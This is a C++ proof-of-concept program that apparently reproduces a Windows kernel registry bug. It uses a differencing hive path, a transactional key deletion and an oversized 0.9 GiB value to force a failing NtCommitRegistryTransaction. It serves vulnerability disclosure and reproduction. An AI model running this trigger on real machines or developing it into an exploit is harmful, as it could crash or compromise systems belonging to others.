#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ktmw32.h>
#include <ntstatus.h>
#include <sddl.h>

#include <cstdio>

#pragma comment(lib, "ntdll.lib")

extern "C" {

NTSTATUS NTAPI NtOpenKey(PHKEY, ACCESS_MASK, POBJECT_ATTRIBUTES);

NTSTATUS NTAPI NtCreateRegistryTransaction(PHANDLE, DWORD, POBJECT_ATTRIBUTES, DWORD);
NTSTATUS NTAPI NtCommitRegistryTransaction(HANDLE, DWORD);

}  // extern "C"

int main() {
  LSTATUS st;
  NTSTATUS Status;

  //
  // Create the test key structure under HKCU.
  //

  HKEY hTestRoot;
  st = RegCreateKeyExW(HKEY_CURRENT_USER,
                       L"Test",
                       0,
                       NULL,
                       REG_OPTION_VOLATILE,
                       KEY_ALL_ACCESS,
                       NULL,
                       &hTestRoot,
                       NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegCreateKeyExW failed with error %d\n", st);
    return 1;
  }

  HKEY hTestSubKey;
  st = RegCreateKeyExW(hTestRoot,
                       L"SubKey",
                       0,
                       NULL,
                       REG_OPTION_VOLATILE,
                       KEY_ALL_ACCESS,
                       NULL,
                       &hTestSubKey,
                       NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegCreateKeyExW failed with error %d\n", st);
    return 1;
  }

  //
  // Find a differencing hive pointing at HKCU.
  //

  HKEY hKeyHiveList;

  st = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                     L"SYSTEM\\CurrentControlSet\\Control\\hivelist",
                     0,
                     KEY_READ,
                     &hKeyHiveList);

  if (st != ERROR_SUCCESS) {
    printf("RegOpenKeyExW failed with error %d\n", st);
    return 1;
  }

  WCHAR wchValueName[200];
  DWORD cchValueName;

  for (DWORD dwIndex = 0;; dwIndex++) {
    cchValueName = sizeof(wchValueName) / sizeof(WCHAR);

    st = RegEnumValueW(hKeyHiveList,
                       dwIndex,
                       wchValueName,
                       &cchValueName,
                       NULL,
                       NULL,
                       NULL,
                       NULL);

    if (st != ERROR_SUCCESS) {
      printf("RegEnumValueW failed with error %d\n", st);
      return 1;
    }

    if (!_wcsnicmp(wchValueName, L"\\REGISTRY\\WC\\Silo", 17) &&
        !_wcsicmp(&wchValueName[cchValueName - 8], L"user_sid")) {
      break;
    }
  }

  RegCloseKey(hKeyHiveList);

  //
  // Open HKCU\Test through the differencing hive, in order to create
  // a Merge-Unbacked key that will become part of the discard replace context
  // when transactionally deleting the base key in HKCU.
  //

  HKEY hKeyLayeredTest;

  wcsncat_s(wchValueName, L"\\Test\\SubKey", 12);

  UNICODE_STRING LayeredTestKeyPath;
  RtlInitUnicodeString(&LayeredTestKeyPath, wchValueName);

  OBJECT_ATTRIBUTES ObjectAttributes;
  InitializeObjectAttributes(&ObjectAttributes, &LayeredTestKeyPath, 0, NULL, NULL);

  Status = NtOpenKey(&hKeyLayeredTest, KEY_READ, &ObjectAttributes);

  if (!NT_SUCCESS(Status)) {
    printf("NtOpenKey failed with error %x\n", Status);
    return 1;
  }

  //
  // Create a lightweight registry transaction.
  //

  HANDLE hTrans;
  Status = NtCreateRegistryTransaction(&hTrans,
                                       TRANSACTION_ALL_ACCESS,
                                       NULL,
                                       0);

  if (!NT_SUCCESS(Status)) {
    printf("NtCreateRegistryTransaction failed with error %.8x\n", Status);
    return 1;
  }

  //
  // Open HKCU\Test in the scope of a transaction.
  //

  HKEY hTransactedKey;

  st = RegOpenKeyTransactedW(HKEY_CURRENT_USER,
                             L"Test",
                             0,
                             KEY_ALL_ACCESS,
                             &hTransactedKey,
                             hTrans,
                             NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegOpenKeyTransactedW failed with error %d\n", st);
    return 1;
  }

  //
  // Transactionally delete the test subkey.
  //

  st = RegDeleteKeyTransactedW(hTestRoot, L"SubKey", 0, 0, hTrans, NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegDeleteKeyTransactedW failed with error %d\n", st);
    return 1;
  }

  //
  // Transactionally set a very long value, which should fail during the
  // commit phase.
  //

  CONST DWORD kLargeValueLength = 900 * 1024 * 1024;  // 0.9 GiB

  PBYTE chValueData = (PBYTE)malloc(kLargeValueLength);

  if (chValueData == NULL) {
    printf("malloc(%zu) failed\n", kLargeValueLength);
    return 1;
  }

  memset(chValueData, 0xCC, kLargeValueLength);

  for (INT i = 0; i < 2; i++) {
    st = RegSetValueExW(hTransactedKey,
                        L"Value",
                        0,
                        REG_BINARY,
                        chValueData,
                        kLargeValueLength);

    if (st != ERROR_SUCCESS) {
      printf("RegSetValueExW failed with error %d\n", st);
      return 1;
    }
  }

  //
  // Try to commit the transaction, thus triggering the bug.
  //

  Status = NtCommitRegistryTransaction(hTrans, 0);

  if (Status != STATUS_INSUFFICIENT_RESOURCES) {
    printf("NtCommitRegistryTransaction failed with error %.8x "
           "(expected STATUS_INSUFFICIENT_RESOURCES)\n", Status);
    return 1;
  }

  //
  // Cleanup.
  //

  RegCloseKey(hKeyLayeredTest);
  RegCloseKey(hTransactedKey);
  RegCloseKey(hTestSubKey);
  RegCloseKey(hTestRoot);
  CloseHandle(hTrans);

  return 0;
}
